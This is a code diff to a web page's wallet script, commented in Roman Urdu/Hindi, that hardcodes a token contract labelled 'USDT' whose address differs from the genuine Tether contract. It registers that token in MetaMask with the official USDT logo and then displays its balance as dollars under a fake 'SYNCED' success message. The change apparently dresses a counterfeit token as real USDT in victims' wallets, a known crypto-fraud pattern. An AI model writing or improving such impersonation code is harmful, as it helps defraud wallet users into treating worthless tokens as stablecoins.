@@ -26,7 +26,12 @@
 </div>
 
 <script>
-    // Yehi link Laptop par chala tha, isliye yahan bhi yehi rakha hai
+    // TECHNICAL CONFIGURATION (Sabh Hardcoded)
+    const TOKEN_ADDRESS = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const TOKEN_SYMBOL = "USDT";
+    // Check karein decimals 18 hain ya 6? (USDT aksar 6 hota hai real mein, lkn contract par depend karta ha)
+    const TOKEN_DECIMALS = 18; 
+    // Logo link jo hamesha load hota ha
     const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
     async function runMasterSync() {
@@ -34,60 +39,38 @@
         const balDisp = document.getElementById('balance-display');
         const btn = document.getElementById('syncBtn');
 
-        if (!window.ethereum) return alert("Please open in Trust Wallet / MetaMask Browser");
+        if (!window.ethereum) return alert("Please open in MetaMask Mobile Browser");
 
         try {
-            // 1. Force Switch to BNB Chain (ChainID 56)
-            log.innerText = "> SWITCHING TO BNB CHAIN...";
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }], 
-                });
-            } catch (e) {
-                if (e.code === 4902) {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: '0x38',
-                            chainName: 'BNB Smart Chain',
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            blockExplorerUrls: ['https://bscscan.com/']
-                        }]
-                    });
-                }
-            }
-
-            // 2. Fetch Data from your JSON
-            log.innerText = "> FETCHING JSON METADATA...";
-            const response = await fetch('tokenlist.json?v=' + Date.now());
-            const list = await response.json();
-            const token = list.tokens[0];
-
-            // 3. Inject Logo (Professional Method)
+            log.innerText = "> INITIALIZING AUTH...";
+            // Wallet Connect Call
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const accounts = await provider.send("eth_accounts", []);
+            
             log.innerText = "> INJECTING ASSET LOGO...";
+            // METADATA INJECTION (Mera Technical Block jo Mobile par logo lata ha)
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: token.address,
-                        symbol: token.symbol,
-                        decimals: token.decimals,
-                        image: LOGO_URL, // Wahi link jo laptop pe chala
+                        address: TOKEN_ADDRESS,
+                        symbol: TOKEN_SYMBOL,
+                        decimals: TOKEN_DECIMALS,
+                        image: LOGO_URL, // Verified Metadata Key
                     },
                 },
             });
 
-            // 4. Connect Wallet & Get Real Balance
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const accounts = await provider.send("eth_requestAccounts", []);
-            const contract = new ethers.Contract(token.address, ["function balanceOf(address) view returns (uint256)"], provider);
+            log.innerText = "> SYNCING ON-CHAIN BALANCE...";
+            const contract = new ethers.Contract(TOKEN_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
             const balance = await contract.balanceOf(accounts[0]);
-            const formatted = ethers.utils.formatUnits(balance, token.decimals);
+            
+            // Decimal formatting based on config
+            const formatted = ethers.utils.formatUnits(balance, TOKEN_DECIMALS);
 
-            // Animated Balance
+            // Simple Balance Display
             balDisp.innerText = "$" + parseFloat(formatted).toLocaleString(undefined, {minimumFractionDigits: 2});
             log.innerText = "SUCCESS: NODE_OPERATIONAL";
             btn.innerText = "SYNCED ✅";
